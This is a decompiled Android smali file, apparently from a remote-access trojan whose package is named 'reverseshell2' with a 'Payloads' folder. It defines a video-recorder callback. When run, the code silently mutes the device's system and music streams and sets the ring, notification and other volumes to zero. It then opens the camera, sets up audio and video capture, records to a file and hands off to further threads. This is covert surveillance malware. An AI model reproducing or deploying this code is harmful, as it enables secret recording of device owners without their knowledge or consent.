.class Lcom/example/reverseshell2/Payloads/videoRecorder$1;
.super Ljava/lang/Object;
.source "videoRecorder.java"

# interfaces
.implements Landroid/view/SurfaceHolder$Callback;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/reverseshell2/Payloads/videoRecorder;->startVideo(ILjava/io/OutputStream;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

.field final synthetic val$cameraID:I

.field final synthetic val$outputStream:Ljava/io/OutputStream;


# direct methods
.method constructor <init>(Lcom/example/reverseshell2/Payloads/videoRecorder;ILjava/io/OutputStream;)V
    .locals 0

    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    iput p2, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->val$cameraID:I

    iput-object p3, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->val$outputStream:Ljava/io/OutputStream;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public surfaceChanged(Landroid/view/SurfaceHolder;III)V
    .locals 0

    return-void
.end method

.method public surfaceCreated(Landroid/view/SurfaceHolder;)V
    .locals 6

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-virtual {v0}, Lcom/example/reverseshell2/Payloads/videoRecorder;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "audio"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/AudioManager;

    const/4 v1, 0x1

    invoke-virtual {v0, v1, v1}, Landroid/media/AudioManager;->setStreamMute(IZ)V

    const/4 v2, 0x3

    invoke-virtual {v0, v2, v1}, Landroid/media/AudioManager;->setStreamMute(IZ)V

    const/4 v2, 0x4

    const/4 v3, 0x0

    invoke-virtual {v0, v2, v3, v3}, Landroid/media/AudioManager;->setStreamVolume(III)V

    const/16 v4, 0x8

    invoke-virtual {v0, v4, v3, v3}, Landroid/media/AudioManager;->setStreamVolume(III)V

    const/4 v4, 0x5

    invoke-virtual {v0, v4, v3, v3}, Landroid/media/AudioManager;->setStreamVolume(III)V

    const/4 v5, 0x2

    invoke-virtual {v0, v5, v3, v3}, Landroid/media/AudioManager;->setStreamVolume(III)V

    :try_start_0
    iget-object v3, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    iget v5, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->val$cameraID:I

    invoke-static {v5}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v5

    invoke-static {v3, v5}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$002(Lcom/example/reverseshell2/Payloads/videoRecorder;Landroid/hardware/Camera;)Landroid/hardware/Camera;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    nop

    sget-object v3, Lcom/example/reverseshell2/Payloads/videoRecorder;->TAG:Ljava/lang/String;

    const-string v5, "camera ready"

    invoke-static {v3, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v3, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    new-instance v5, Landroid/media/MediaRecorder;

    invoke-direct {v5}, Landroid/media/MediaRecorder;-><init>()V

    invoke-static {v3, v5}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$102(Lcom/example/reverseshell2/Payloads/videoRecorder;Landroid/media/MediaRecorder;)Landroid/media/MediaRecorder;

    iget-object v3, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v3}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$000(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/hardware/Camera;

    move-result-object v3

    invoke-virtual {v3}, Landroid/hardware/Camera;->unlock()V

    iget-object v3, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v3}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;

    move-result-object v3

    invoke-interface {p1}, Landroid/view/SurfaceHolder;->getSurface()Landroid/view/Surface;

    move-result-object v5

    invoke-virtual {v3, v5}, Landroid/media/MediaRecorder;->setPreviewDisplay(Landroid/view/Surface;)V

    iget-object v3, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v3}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;

    move-result-object v3

    iget-object v5, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v5}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$000(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/hardware/Camera;

    move-result-object v5

    invoke-virtual {v3, v5}, Landroid/media/MediaRecorder;->setCamera(Landroid/hardware/Camera;)V

    iget-object v3, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v3}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;

    move-result-object v3

    invoke-virtual {v3, v4}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    iget-object v3, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v3}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;

    move-result-object v3

    invoke-virtual {v3, v1}, Landroid/media/MediaRecorder;->setVideoSource(I)V

    :try_start_1
    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v1}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;

    move-result-object v1

    invoke-static {v2}, Landroid/media/CamcorderProfile;->get(I)Landroid/media/CamcorderProfile;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setProfile(Landroid/media/CamcorderProfile;)V
    :try_end_1
    .catch Ljava/lang/RuntimeException; {:try_start_1 .. :try_end_1} :catch_1

    nop

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt v1, v2, :cond_0

    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v1}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;

    move-result-object v1

    iget-object v2, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    iget-object v2, v2, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;

    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/io/File;)V

    goto :goto_0

    :cond_0
    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v1}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;

    move-result-object v1

    iget-object v2, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    iget-object v2, v2, Lcom/example/reverseshell2/Payloads/videoRecorder;->videoFile:Ljava/io/File;

    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    :goto_0
    :try_start_2
    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v1}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;

    move-result-object v1

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->prepare()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_1

    :catch_0
    move-exception v1

    :goto_1
    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$1;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    invoke-static {v1}, Lcom/example/reverseshell2/Payloads/videoRecorder;->access$100(Lcom/example/reverseshell2/Payloads/videoRecorder;)Landroid/media/MediaRecorder;

    move-result-object v1

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->start()V

    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lcom/example/reverseshell2/Payloads/videoRecorder$1$3;

    invoke-direct {v2, p0}, Lcom/example/reverseshell2/Payloads/videoRecorder$1$3;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder$1;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    return-void

    :catch_1
    move-exception v1

    invoke-virtual {v1}, Ljava/lang/RuntimeException;->printStackTrace()V

    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lcom/example/reverseshell2/Payloads/videoRecorder$1$2;

    invoke-direct {v3, p0}, Lcom/example/reverseshell2/Payloads/videoRecorder$1$2;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder$1;)V

    invoke-direct {v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v2}, Ljava/lang/Thread;->start()V

    return-void

    :catch_2
    move-exception v1

    sget-object v2, Lcom/example/reverseshell2/Payloads/videoRecorder;->TAG:Ljava/lang/String;

    const-string v3, "Error in opening camera"

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lcom/example/reverseshell2/Payloads/videoRecorder$1$1;

    invoke-direct {v3, p0}, Lcom/example/reverseshell2/Payloads/videoRecorder$1$1;-><init>(Lcom/example/reverseshell2/Payloads/videoRecorder$1;)V

    invoke-direct {v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v2}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public surfaceDestroyed(Landroid/view/SurfaceHolder;)V
    .locals 0

    return-void
.end method
